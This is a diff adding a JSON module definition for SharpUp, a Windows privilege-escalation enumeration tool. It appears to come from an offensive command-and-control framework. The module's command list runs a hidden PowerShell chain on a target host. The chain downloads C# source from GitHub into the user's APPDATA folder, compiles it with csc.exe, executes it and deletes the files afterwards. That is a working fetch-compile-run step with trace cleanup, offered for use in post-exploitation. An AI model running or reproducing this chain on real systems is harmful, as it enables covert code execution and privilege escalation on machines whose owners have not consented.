@@ -1,0 +1,32 @@
+{
+  "base": {
+    "name": "SharpUp",
+    "type": "standard",
+    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
+    "credits": ["Will Schroeder (@harmj0y)"],
+    "path": ["windows", "x64", "csharp", "privesc", "SharpUp.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "csharp",
+    "privilege": false,
+    "remote": "https://raw.githubusercontent.com/GhostPack/SharpUp/master/SharpUp/Program.cs",
+    "local": ["data", "src", "GhostPack", "SharpUp", "SharpUp", "Program.cs"],
+    "options": [
+      {"name": ".NetVersion", "value": "v4.*", "required": true, "flag": "", "description":"The .Net Framework version compiler to use (i.e. v3.0, v3.5, or v4.*)"},
+      {"name": "FileName", "value": "SharpUp", "required": true, "flag": "", "description":"The filename, without the file extension, used for the resulting source code and compiled files"}
+    ],
+    "description": "SharpUp is a C# port of various PowerUp functionality. Currently, only the most common checks have been ported; no weaponization functions have yet been implemented.  This module downloads the project's C# source code, compiles it with .Net's csc.exe, executes it, and then deletes the files.",
+    "notes": "\r\n\t-SharpUp was created by Will Schroeder (@harmj0y) and is part of the 👻 GhostPack tool set: https://github.com/GhostPack/SharpUp\r\n\t",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w 1",
+      "\"",
+      "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/GhostPack/SharpUp/master/SharpUp/Program.cs', $env:APPDATA+'\\\\{{FileName.Value}}.cs');",
+      "c:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\{{.NetVersion.Value}}\\\\csc.exe /unsafe /out:$env:APPDATA\\\\{{FileName.Value}}.exe $env:APPDATA\\\\{{FileName.Value}}.cs;",
+      "&$env:APPDATA\\\\{{FileName.Value}}.exe",
+      ";del $env:APPDATA\\\\{{FileName.Value}}.*",
+      "\""
+    ]
+  }
+}
